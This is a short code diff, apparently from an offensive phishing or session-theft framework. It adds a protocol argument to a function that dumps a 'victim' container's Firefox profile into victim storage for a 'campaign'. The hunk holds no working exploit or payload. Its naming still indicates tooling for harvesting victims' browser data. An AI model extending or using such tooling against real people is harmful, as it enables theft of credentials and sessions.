@@ -500,6 +500,7 @@ async def dump_victim_container(campaign, victim_id: str) -> None:
     await dump_firefox_data(
         container_name,
         victim_storage_path / "firefox_profile.zip",
+        protocol=campaign.protocol,
     )
 
 
